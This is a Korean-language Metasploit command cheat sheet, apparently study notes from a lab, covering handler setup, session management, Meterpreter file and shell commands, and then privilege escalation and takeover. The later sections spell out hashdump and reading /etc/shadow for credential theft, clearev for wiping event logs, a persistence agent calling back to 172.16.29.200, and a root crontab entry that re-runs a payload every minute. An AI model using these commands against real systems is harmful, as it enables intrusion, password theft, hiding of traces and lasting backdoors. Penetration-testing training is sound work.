버벅거리지 않게 메타스플로잇(Metasploit) 조작 핵심 명령어를 상황별로 싹 긁어왔음. 메모장에 복붙해서 보면서 작업하시길 바람.

## 1. 핸들러 세팅 및 관리 (Pre-Exploit)
공격을 시작하기 전, 함정을 파고 설정을 확인하는 단계임.

show options: 현재 설정된 LHOST, LPORT, Payload 등 모든 옵션을 출력함.

set [옵션] [값]: 특정 옵션의 값을 설정함 (예: set LHOST 172.16.29.200).

setg [옵션] [값]: 전역(Global) 옵션으로 설정하여, 다른 모듈로 옮겨가도 값이 유지되게 함.

exploit -j: 핸들러를 백그라운드 작업(Job)으로 실행하여 세션 대기 상태를 유지함.

jobs -l: 현재 백그라운드에서 돌고 있는 핸들러 리스트를 확인함.

jobs -k [ID]: 특정 핸들러 작업을 종료함.

## 2. 세션 제어 (Console Management)
세션이 맺어진 후, 여러 타겟을 관리할 때 쓰는 명령어임.

sessions: 현재 연결된 모든 활성화된 세션 리스트를 보여줌.

sessions -i [ID]: 특정 ID의 세션 안으로 들어가서 상호작용함.

background (또는 Ctrl + Z): 현재 세션을 끊지 않고 백그라운드로 보낸 뒤 msf > 프롬프트로 복귀함.

sessions -k [ID]: 특정 세션을 강제로 종료함.

sessions -u [ID]: 일반 쉘 세션을 Meterpreter 세션으로 업그레이드 시도함.

## 3. Meterpreter 내부 핵심 명령어 (Inside the Session)
타겟 서버 내부를 장악한 뒤 정보를 캐내거나 파일을 조작할 때 씀.

sysinfo: 타겟 시스템의 OS, 아키텍처(x86/x64), 컴퓨터 이름을 확인함.

getuid: 현재 내가 어떤 권한(예: www-data, root)으로 들어와 있는지 확인함.

ls / cd / pwd: 리눅스 터미널처럼 파일 목록 확인, 폴더 이동, 현재 위치 확인을 수행함.

upload [로컬경로] [타겟경로]: 내 컴퓨터(Kali)의 파일을 타겟 서버로 전송함.

download [타겟경로] [로컬경로]: 타겟 서버의 파일을 내 컴퓨터로 가져옴.

cat [파일명]: 파일의 내용을 화면에 출력함.

shell: 타겟 시스템의 실제 운영체제 쉘(bash/cmd)을 실행함.

## 4. 침투 고도화 (Advanced Commands)
권한을 높이거나 흔적을 지울 때 유용함.

getsystem: (Windows 전용) 현재 권한에서 가장 높은 SYSTEM 권한 획득을 시도함.

hashdump: 시스템에 저장된 사용자들의 비밀번호 해시값을 추출함.

clearev: 타겟 서버의 이벤트 로그를 삭제하여 흔적을 지움.

idletime: 타겟 사용자가 마지막으로 키보드/마우스를 움직인 지 얼마나 됐는지 확인함 (잠입 중 유용).

------------------여기서 부턴 권한상승 및 시스템 장악-----------------------
## 1. 시스템 정밀 분석 (루트 권한의 틈새 찾기)
세션에 들어가자마자 적의 방어 체계에서 가장 약한 고리를 찾아내는 명령어들임.

run post/multi/recon/local_exploit_suggester: 시스템의 커널 취약점을 분석해서 root로 올라갈 수 있는 공격 코드를 추천해 줌 (지난번에 찾은 그 보물지도임).

shell → uname -a: 현재 커널 버전을 확인함. 버전이 낮으면(예: 2.6.x) 구글에 'Kernel [버전] exploit'만 쳐도 root 권한 뺏는 코드가 쏟아짐.

shell → find / -perm -u=s -type f 2>/dev/null: SUID가 설정된 파일을 찾음. 관리자 권한으로 실행되는 파일 중에 취약한 게 있다면 그걸 징검다리 삼아 바로 root가 될 수 있음.

## 2. 데이터베이스 & 비밀번호 탈취 (전리품 챙기기)
시스템 장악의 꽃은 결국 정보 탈취임.

hashdump: 시스템 사용자들의 비밀번호 해시값을 한 번에 긁어옴 (성공하면 왕께서 그들의 계정으로 당당히 로그인할 수 있음).

cat /etc/passwd / cat /etc/shadow: 리눅스 사용자 계정과 암호화된 비밀번호가 담긴 파일임 (root 권한 확보 후 필수 확인 코스).

ls -R /var/www/html: 웹 서버의 모든 파일을 훑어서 DB 접속 정보가 담긴 config.php 같은 파일을 찾음.

## 3. 작전 지속성 확보 (뒷문 만들기)
콘솔 창을 닫아도, 서버가 재부팅되어도 다시 접속할 수 있게 만드는 '스텔스' 기술임.

run persistence -X -i 10 -p 4444 -r 172.16.29.200: 10초마다 자동으로 왕의 서버에 접속을 시도하는 영구적인 에이전트를 심음.

shell → echo "* * * * * /tmp/shell_x86.elf" >> /var/spool/cron/crontabs/root: 크론탭(Crontab) 스케줄러를 이용해서 1분마다 독(Payload)을 강제로 실행하게 만듦.
